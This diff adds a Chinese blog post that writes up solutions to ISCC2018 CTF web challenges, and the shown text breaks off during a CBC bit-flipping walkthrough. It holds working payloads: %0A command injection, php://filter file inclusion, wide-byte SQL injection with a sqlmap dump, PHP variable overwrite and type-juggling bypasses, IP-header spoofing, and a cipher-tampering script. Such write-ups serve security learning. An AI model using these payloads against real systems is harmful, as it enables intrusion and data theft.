@@ -252,6 +252,1033 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/25/iscc2018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/25/iscc2018/" itemprop="url">ISCC2018 write up</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-25T20:04:18+08:00">
+                2018-05-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ISCC2018-write-up"><a href="#ISCC2018-write-up" class="headerlink" title="ISCC2018 write up"></a>ISCC2018 write up</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>参加2018年的iscc比赛，将做出的题记录到这里</strong></p>
+<h2 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><strong>HINT：只要比服务器上的数字大就好了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/k890aKHIcH.png?imageslim" alt="mark"><br><strong>发现题目只有一个输入框，限制只能输入3个字符，于是firebug查看元素，发现maxlength值为3，将3改为100，随意输入个大数字，flag就出来了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/KB7LcgEd58.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9FAh3mK44g.png?imageslim" alt="mark"><br><code>flag:key is 768HKyu678567&amp;*&amp;K</code></p>
+<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><strong>HINT：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</strong></p>
+<p><strong>该题为web的签到题，打开后发现是这样的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/aKd6GiJf4J.png?imageslim" alt="mark"><br><strong>必须从本地访问，于是想到了伪造X-Forwarded-For，后来发现直接访问源代码就能得到flag，果然是签到题啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/I3BaAJJmlC.png?imageslim" alt="mark"><br><code>flag:ISCC{^&amp;*(UIHKJjkadshf}</code></p>
+<h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><strong>HINT:如果你对xss了解的话,那你一定知道key是什么了，加油！</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h75EeL54G5.png?imageslim" alt="mark"><br><strong>看到xss便首先尝试在输入框里提交XSSPaylaod，结果发现根本找不到输出点，不管提交多少次都是”加油再试一次”，然后发现页面有一串字符非常像base64编码</strong><br><code>ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0</code><br><strong>base64解码了一下，发现是XSSpayload，里面有我们要的key</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2bJ3AL2hc5.png?imageslim" alt="mark"><br><strong>因为key的16进制中有00，代表结束符（截断），所以要将key中的00字符都删掉，才能将key复制下来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IKHk1diJmC.png?imageslim" alt="mark"><br><strong>key:/%nsfocusXSStest%/</strong></p>
+<p><strong>key不是flag，将<code>/%nsfocusXSStest%/</code>提交到页面输入框才能弹出来flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/Je6hfIh43H.png?imageslim" alt="mark"><br><strong>建议出题人将这题放到杂项会比较合适，有点挂羊头卖狗肉的意思</strong></p>
+<p><code>flag{Hell0World}</code></p>
+<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p><strong>HINT：好像有个文件忘记删了</strong></p>
+<p><strong>自己的字典太垃圾，啥也没扫出来，经过一个表哥强大的字典发现扫出了<code>index.php.txt</code>，内容如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jkblH5Kk5G.png?imageslim" alt="mark"></p>
+<pre><code>&lt;?php
+
+include &quot;flag.php&quot;;
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)
+    die(&quot;flag is here&quot;);
+
+if (!isset($_POST[&quot;flag&quot;]) )
+    die($_403);
+
+foreach ($_GET as $k =&gt; $v){
+    $$k = $$v;
+}
+
+foreach ($_POST as $k =&gt; $v){
+    $$k = $v;
+}
+
+if ( $_POST[&quot;flag&quot;] !== $flag )
+    die($_403);
+
+echo &quot;flag: &quot;. $flag . &quot;\n&quot;;
+die($_200);
+
+?&gt;
+</code></pre><p><strong>进行一波代码审计发现考察的是php变量覆盖，构造payload</strong><br><code>http://118.190.152.202:8009/index.php?_200=flag</code></p>
+<p><strong>带上POST参数</strong></p>
+<p><code>flag=</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IdjaIcj9CF.png?imageslim" alt="mark"><br><strong>我来讲解一下详细的过程，首先代码要求必须有POST参数，而且POST参数的参数名必须为flag，这样才可以到变量覆盖的那一步,接着提交GET参数<code>_200=flag</code>,php代码遍历<code>$_GET</code>数组执行的便是<code>$_200=$flag</code>,也就是将变量<code>$flag</code>的值复制给<code>$_200</code>,覆盖原先变量<code>$_200</code>的值,此时变量<code>$_200</code>的值为<code>$flag</code>中的值，接着php遍历$_POST数组，我们提交的POST参数为<code>flag=空(任意值)</code>，于是将POST的值复制给<code>$flag</code>值，覆盖原先的<code>$flag</code>值，<code>$_POST[&quot;flag&quot;]</code>便会和$flag值相等，都为空(任意值)，最后输出变量<code>$_200</code>的值，也就是原先$flag中的flag</strong></p>
+<p><code>flag: ISCC{taolu2333333....}</code></p>
+<h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><strong>HINT:没过滤好啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8iAckg2jJl.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8008/index.php?f=articles&amp;id=1</code></p>
+<p><strong>一开始以为id参数没过滤好，于是尝试了注入，结果被坑了，原来是f参数没过滤好，存在文件包含，通过文件包含漏洞使用php伪协议读取<code>index.php</code></strong></p>
+<p><code>payload:http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=1</code><br><strong>payload中的php要大写，否则会被拦截</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0EI1Ab470E.png?imageslim" alt="mark"><br><strong>得到一串base64，解码得到源码，源码中有flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8H5eamIhbg.png?imageslim" alt="mark"><br><code>flag:ISCC{LFIOOOOOOOOOOOOOO}</code></p>
+<h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/C08eGC3cDg.png?imageslim" alt="mark"><br><strong>要求ip为本机ip，尝试Referer和X-forwarded-For都不行，最后搜索了一番，发现伪造ip还可以用Client-ip</strong></p>
+<p><strong>将ip伪造成127.0.0.1即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/kA4aAedK42.png?imageslim" alt="mark"></p>
+<p><code>flag:ISCC{iscc_059eeb8c0c33eb62}</code></p>
+<h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p><strong>HINT:我都过滤了，看你怎么绕。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/6kbkCADHgl.png?imageslim" alt="mark"><br><strong>看到这样一句话：请ping我的IP 看你会ping通吗</strong></p>
+<p><strong>尝试</strong></p>
+<p><code>http://118.190.152.202:8018/?ip=118.190.152.202</code></p>
+<p><strong>发现可以执行ping命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/1CA2g26002.png?imageslim" alt="mark"><br><strong>猜测后台php代码应该如下,类似于dvwa中的命令执行</strong></p>
+<p><code>shell_exec( &#39;ping  &#39; . waf($_GET[ip]) )</code><br><strong>尝试在ping命令后执行多条命令，发现<code>&amp;</code>，<code>&amp;&amp;</code>，<code>|</code>都不行，最后测试发现使用<code>%0A</code>可以绕过,读取flag.txt payload</strong></p>
+<p><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20flag.txt</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/5L8D3L0D46.png?imageslim" alt="mark"><br><strong>读取index.php payload</strong><br><code>http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20index.php</code><br><strong>可以看到源码里正如我们之前猜测的那样</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2mDam747m1.png?imageslim" alt="mark"></p>
+<p>请ping我的IP 看你会ping通吗</p>
+<pre><code>PING www.a.shifen.com (180.149.132.151) 56(84) bytes of data.
+64 bytes from 180.149.132.151: icmp_seq=1 ttl=51 time=23.8 ms
+
+--- www.a.shifen.com ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 23.871/23.871/23.871/0.000 ms
+ &apos;&apos;,
+        &apos;;&apos; =&gt; &apos;&apos;,
+        &apos;|&apos; =&gt; &apos;&apos;,
+        &apos;-&apos;  =&gt; &apos;&apos;,
+        &apos;$&apos;  =&gt; &apos;&apos;,
+        &apos;(&apos;  =&gt; &apos;&apos;,
+        &apos;)&apos;  =&gt; &apos;&apos;,
+        &apos;`&apos;  =&gt; &apos;&apos;,
+        &apos;||&apos; =&gt; &apos;&apos;,
+    );
+
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+
+
+    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+        // Windows
+
+        $cmd = shell_exec( &apos;ping  &apos; . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );
+    }
+
+
+    echo  &quot;
+
+{$cmd}
+
+&quot;;
+
+
+?&gt;
+</code></pre><p><strong>当然这到题也有非常规解法，既然要用命令执行去读取flag.txt，不如直接访问网站根目录下的<code>flag.txt</code>就能得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/d00m3BBaJA.png?imageslim" alt="mark"><br><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></p>
+<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9DH41ccHi2.png?imageslim" alt="mark"><br><strong>题目说<code>Please give me username or password!</code></strong></p>
+<p><strong>那在url后添加GET参数username与password</strong><br><code>http://118.190.152.202:8017/?username=&amp;&amp;password=</code></p>
+<p><strong>再查看源代码可以看到html注释里面有个index.php.txt</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/HHEbkm3GJI.png?imageslim" alt="mark"></p>
+<p><strong>访问index.php.txt,发现源代码，又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/G77749Jh9h.png?imageslim" alt="mark"></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$flag = &quot;***********&quot;;    
+if(isset($_GET[&apos;username&apos;])){
+    if (0 == strcasecmp($flag,$_GET[&apos;username&apos;])){
+    $a = fla;
+    echo &quot;very good!Username is right&quot;;
+    }
+    else{
+    print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;}
+}else
+print &apos;Please give me username or password!&apos;;
+if (isset($_GET[&apos;password&apos;])){
+    if (is_numeric($_GET[&apos;password&apos;])){
+        if (strlen($_GET[&apos;password&apos;]) &lt; 4){
+            if ($_GET[&apos;password&apos;] &gt; 999){
+            $b = g;
+            print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;
+        }else 
+            print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;
+        }else
+        print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;
+    }else
+    print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;
+}
+if ($a.$b == &quot;flag&quot;)
+    print $flag;
+?&gt;
+</code></pre><p><strong>可以看到只要绕过对username和password的过滤便能得到flag</strong></p>
+<p><strong>strcasecmp的绕过可以用数组，因为php的特性，将一个字符串与数组比较时因为类型不一致会发返回0，后面要求数字长度小于4且大于999可以用php中的科学计数法绕过，构造payload</strong></p>
+<p><code>http://118.190.152.202:8017/?username[]=&amp;&amp;password=1e9</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/jad86261b6.png?imageslim" alt="mark"><br><code>flag{ISCC2018_Very_GOOD!}</code></p>
+<h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/CdD15BHHI4.png?imageslim" alt="mark"><br><strong>找到一个可能存在注入的连接</strong><br><code>http://118.190.152.202:8015/index.php?id=1</code></p>
+<p><strong>猜测id参数可能存在注入，加单引号和双引号页面均返回正常并不会报错，于是猜测引号可能被转义了，尝试宽字节注入</strong></p>
+<p><code>http://118.190.152.202:8015/index.php?id=1%df&#39;</code></p>
+<p><strong>发现页面返回不正常</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/8C724Eil08.png?imageslim" alt="mark"><br><strong>and逻辑判断确认存在注入</strong></p>
+<p><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=1%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/hACeHiC64h.png?imageslim" alt="mark"><br><code>http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=2%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h6DJ3HlLag.png?imageslim" alt="mark"><br><strong>order by 测试出列数为8，union查询确定出注入回显的位置</strong></p>
+<p><code>http://118.190.152.202:8015/index.php?id=-1%df&#39; union select 1,2,3,4,5,6,7,8%23</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/c4mdGEJk69.png?imageslim" alt="mark"><br><strong>接下来可以union手工注入，也可以用sqlmap跑，sqlmap跑的时候要使用tamper脚本<code>unmagicquotes.py</code>来绕过单引号转义过滤，为了方便直接上sqlmap，获取flag的命令</strong></p>
+<p><code>sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1&#39;&quot; --dump -C &quot;flag&quot; -T &quot;admins&quot; -D &quot;baji&quot; --tamper=&quot;unmagicquotes.py&quot;</code><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/mGiCmLAl23.png?imageslim" alt="mark"><br><code>flag:Y0u_@@33w_dxxmn_9rf0Od</code></p>
+<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><strong>HINT:随意开火</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/j0j6jg0BcB.png?imageslim" alt="mark"><br><strong>这道题一开始就觉得是文件包含，但是使用php协议读文件时发现一直出现File not found，一直不知为何，直到谷歌搜出了<a href="http://www.yqxiaojunjie.com/index.php/archives/27/" title="类似的一道题" target="_blank" rel="external">类似的一道题</a>才找到思路，这里的思路大概一样，只要绕过正则表达式即可，经过模糊测试，发现</strong></p>
+<p><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=../flag.php</code><br><strong>可以读到flag.php中的flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/f6GDKF8GmD.png?imageslim" alt="mark"><br><code>flag{1ntere5ting_PHP_Regu1ar_express1onssssss}</code><br><code>http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=show.php</code><br><strong>可以读取show.php查看它的过滤</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/0DjH8FE7G9.png?imageslim" alt="mark"></p>
+<pre><code>&lt;?php
+error_reporting(0);
+ini_set(&apos;display_errors&apos;,&apos;Off&apos;);
+
+include(&apos;config.php&apos;);
+
+$img = $_GET[&apos;img&apos;];
+if(isset($img) &amp;&amp; !empty($img))
+{
+    if(strpos($img,&apos;jpg&apos;) !== false)
+    {
+        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp;preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)
+        {
+            die(&apos;File not found.&apos;);
+        }
+
+        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);
+        if(isset($matches[1]))
+        {
+            $img = $matches[1];
+        }
+
+        header(&apos;Content-Type: image/jpeg&apos;);
+        $data = get_contents($img);
+        echo $data;
+    }
+    else
+    {
+        die(&apos;File not found.&apos;);
+    }
+
+}
+else
+{
+    ?&gt;
+    &lt;img src=&quot;1.jpg&quot;&gt;
+    &lt;?php
+}
+?&gt;
+</code></pre><p><strong>可以看到源码印证了我们之前的猜想</strong></p>
+<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p><strong>打开后是一个登陆页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/2FHFaBllla.png?imageslim" alt="mark"><br><strong>出于习惯首先查看源代码，结果发现泄露了index.php的源码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/cd755b6fif.png?imageslim" alt="mark"><br><strong>查看源代码，可以看出又是一道代码审计题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180508/3a2cLcLmed.png?imageslim" alt="mark"><br><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+include &apos;sqlwaf.php&apos;;
+define(&quot;SECRET_KEY&quot;, &quot;................&quot;);
+define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
+session_start();    
+
+function get_random_iv(){
+    $iv=&apos;&apos;;
+    for($i=0;$i&lt;16;$i++){
+        $iv.=chr(rand(1,255));
+    }
+    return $iv;
+}
+function login($info){
+    $iv=get_random_iv();
+    $plain = serialize($info);
+    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
+    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];
+    setcookie(&quot;iv&quot;, base64_encode($iv));
+    setcookie(&quot;cipher&quot;, base64_encode($cipher));
+}
+function show_homepage(){
+    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){
+        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;
+        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;
+    }else{
+        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;
+        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;
+    }
+    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;
+    die();
+}
+function check_login(){
+    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){
+        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);
+        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);
+        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
+            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);
+            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];
+        }else{
+            die(&quot;ERROR!&quot;);
+        }
+    }
+}    
+
+if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) {
+  $username=waf((string)$_POST[&apos;username&apos;]);
+  $password=waf((string)$_POST[&apos;password&apos;]);
+  if($username === &apos;admin&apos;){
+        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);
+    }else{
+        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);
+        login($info);
+        show_homepage();
+    }
+}
+else{
+  if(isset($_SESSION[&quot;username&quot;])){
+        check_login();
+        show_homepage();
+    }
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Paper login form&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;login&quot;&gt;
+  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+    &lt;h1&gt;Sign In&lt;/h1&gt;
+    &lt;input name=&apos;username&apos; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;
+    &lt;input name=&apos;password&apos; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+    &lt;button&gt;Sign in&lt;/button&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><strong>来看代码的主要执行过程与用户数据流的流向</strong></p>
+<p><strong>首先，如果存在有用户<code>POST</code>传递过来的<code>username</code>与<code>password</code>，那就接收用户输入的<code>username</code>与<code>password</code>，将用户输入的内容转换为字符串类型然后带入waf函数进行过滤检查处理（应该是过滤一些危险字符），之后使用<code>===</code>检查<code>username</code>的值是否为<code>admin</code>，如果相等直接输出<code>You are not real admin!</code>到页面并且结束，否则将<code>username</code>与<code>password</code>存入数组然后带入login函数，通过代码可以看出login函数的主要作用，将传入的存有<code>username</code>与<code>password</code>的数组进行序列化处理后再使用php中的<code>openssl_encrypt</code>函数进行<code>aes-128-cbc</code>加密，加密的初始化向量为随机生成的16字节的字符串，之后将传入的用户名传入服务器中session文件（文件名为<code>28r835361idfvf2g5judamo844</code>）中的<code>username</code>变量中，将初始化向量与加密结果进行base64编码后分别存入cookie中的<code>iv</code>与<code>cipher</code>中，之后cookie就作为该用户的登陆凭证，简单来说，就是如果用户名不等于<code>admin</code>就登陆成功并且将用户名存入服务器的session变量中，之后setcookie，然后进入用户界面，此处使用<code>show_homepage</code>函数判断，这个函数会判断<code>session</code>中的<code>username</code>是否为<code>admin</code>，如果为<code>admin</code>，那就登陆成功并输出flag，否则就以普通用户登录</strong></p>
+<p><strong>如果发现服务器session文件中的username变量已被设置，说明之前有用户登录了，就不使用login函数进行进行登陆检查，而是使用<code>check_login</code>函数进行用户身份检查，通过代码可以看出<code>check_login</code>函数的主要作用，检查cookie中是否设置有<code>cipher</code>和<code>iv</code>，如果有，就对cookie中的<code>cipher</code>与<code>iv</code>进行base64解码，然后使用php中的<code>openssl_decrypt</code>函数进行<code>aes-128-cbc</code>解密，将解密的结果进行反序列化处理为数组，之后将数组中的<code>username</code>赋值给<code>session</code>中的<code>username</code>，之后进入用户登录界面，再次调用<code>show_homepage</code></strong></p>
+<p><strong>来分析一下整个逻辑过程</strong></p>
+<p><strong>简单来说，要求输入的用户名不能为<code>admin</code>才能登陆成功，但是进行用户身份检查时需要<code>$_SESSION</code>中的<code>username</code>必须等于<code>admin</code>才能登陆成功，于是想到了可以首先以一个用户名不是<code>admin</code>的用户登录，设置<code>$_SESSION[&#39;username&#39;]</code>，之后刷新登陆页面，将会带上生成的cookie进入<code>check_login</code>函数,我们可以修改cookie中的cipher与iv，使其经过aes-128-cbc解密反序列化后将<code>$info[&#39;username&#39;]</code>的值变为<code>admin</code>即可覆盖第一次登陆后设置的<code>$_SESSION[&#39;name&#39;]</code>，将其变为<code>admin</code>,此时经过<code>show_homepage</code>后就会是<code>admin</code>并且输出flag</strong></p>
+<p><strong>在这里加密解密的密钥是未知的，iv初始化向量是随机生成的，导致我们不能直接利用加密算法生成cookie，于是想到了一种名为<a href="http://blog.leej.me/2017/05/15/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81CBC%E5%8A%A0%E5%AF%86%E7%BC%BA%E9%99%B7/" title="CBC翻转字节攻击" target="_blank" rel="external">CBC翻转字节攻击</a>的方法，该攻击可以在不知道密钥的前提下，通过修改密文中某一处的字节达到修改部分明文的目的，具体过程如下，首先来看AES的CBC模式的加密解密过程，分组长度为16字节</strong></p>
+<p><strong>加密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/5DL0a7l7mC.jpg?imageslim" alt="mark"><br><strong>解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/K4KH31g4fJ.jpg?imageslim" alt="mark"><br><strong>所谓的CBC翻转字节攻击就是通过修改某一分组的密文，去修改其下一分组的明文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/j3aiLD6Aaf.png?imageslim" alt="mark"><br><strong>比如明文分组如下，以题目举例</strong></p>
+<pre><code>a:2:{s:8:&quot;userna
+me&quot;;s:5:&quot;Admin&quot;;
+s:8:&quot;password&quot;;s
+:6:&quot;123456&quot;;}
+</code></pre><p><strong>要将<code>Admin</code>修改为<code>admin</code>，只需修改加密后第一个分组中的第10个字节，也就是对应<code>A</code>所在位置的<code>&quot;</code>的密文就可以</strong></p>
+<p><strong>首先要以Admin登陆，获取Set-Cookie中的cipher与iv，cipher里面存放着将上面那串字符串加密的密文，iv为随机生成的16位字符串，作为加密解密的初始化向量</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/mmBJ5lGEJB.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/E46C9Ce2i8.png?imageslim" alt="mark"></p>
+<pre><code>iv：pO%2FPPYF9sNQq9oGENmDdFA%3D%3D
+cipher：bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D
+</code></pre><p><strong>首先修改密文的第一个分组的第十个字节</strong></p>
+<pre><code>import urllib
+import base64
+#a:2:{s:8:&quot;userna
+#me&quot;;s:5:&quot;Admin&quot;;
+#s:8:&quot;password&quot;;s
+#:6:&quot;123456&quot;;}
+cipher=&quot;bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D&quot;
+cipher=base64.b64decode(urllib.unquote(cipher))
+newcipher=cipher[0:9]+chr(ord(cipher[9])^ord(&apos;A&apos;)^ord(&apos;a&apos;))+cipher[10:]
+print &quot;cipher:\n%s&quot;%(urllib.quote(base64.b64encode(cipher)))
+print &quot;new cipher:\n%s&quot;%(urllib.quote(base64.b64encode(newcipher)))
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180509/m1eaF1BI4h.png?imageslim" alt="mark"><br><strong>我来解释一下这段代码</strong></p>
+<pre><code>首先需要明白一个前提
+异或运算相同为0，不同为1，所以推导出：一个字符和其本身异或结果为0，一个字符和0异或结果为其本身
+
+解密（cipher[9+16]）^cipher[9]=&apos;A&apos;(这是正常的解密过程)
+解密（cipher[9+16]）^cipher[9]^&apos;A&apos;^&apos;a&apos;=&apos;a&apos;（将A变为a，就要将第一分组中的第十个字节cipher[9]进行cipher[9]^&apos;A&apos;^&apos;a&apos;改变）
+</code></pre><p><strong>此时cipher变为了</strong></p>
+<pre><code>bq1cO9PgjsrNf%2B1iItSFPsyT/taue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7/Du5pSgPzuq339vT4EWNfQ%3D%3D
